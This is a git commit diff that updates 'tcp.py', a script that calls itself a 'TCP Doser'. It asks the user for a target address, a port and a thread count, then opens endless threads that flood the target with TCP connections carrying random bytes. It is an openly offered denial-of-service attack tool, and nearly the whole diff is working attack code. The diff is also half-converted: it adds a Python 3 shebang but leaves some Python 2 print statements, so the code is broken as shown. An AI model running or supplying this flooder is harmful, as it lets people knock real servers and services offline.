30059ece3c3e9e47128c46bfb312b0f8fb381670
Leeon123 <37728318+Leeon123@users.noreply.github.com>
2018-11-13 20:00:18 +0800

    Update tcp.py

--- tcp.py
+++ tcp.py
@@ -1,31 +1,37 @@
+#!/usr/bin/python3
+#Code by Leeon123
+
 import threading
 import socket
 import random
 import time
 
 print '''
-###############################
-######  ######    Tcp doser   #
-##### () #####   by LeeOn123  #
-####      ####                #
-###############################'''
+ _____ ____ ____    ____                      
+|_   _/ ___|  _ \  |  _ \  ___  ___  ___ _ __ 
+  | || |   | |_) | | | | |/ _ \/ __|/ _ \ '__|
+  | || |___|  __/  | |_| | (_) \__ \  __/ |   
+  |_| \____|_|     |____/ \___/|___/\___|_|  
+[!]Python3 version               Code By Leeon123 
+================================================'''
 time.sleep(0.5)
-ip = raw_input("Url/ip:")
-port = input("Port:")
-thread_num = input("Threads:")
+ip = str(input("Url/ip:"))
+port = int(input("Port:"))
+thread_num = int(input("Threads:"))
 print "Attacking !!! Thread:",thread_num
 
 def run():
 	bytes = random._urandom(1024)
+	print("[!]Try to build a new thread")
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((str(ip),int(port))) 
 			s.send(bytes)
-			print "Request send!"
+			print ("[*]Request sent!")
 		except:
 			s.close()
-			print "Error, socket close"
+			print ("[!]Error, socket close")
 			
 for i in range(thread_num):
     th = threading.Thread(target = run)
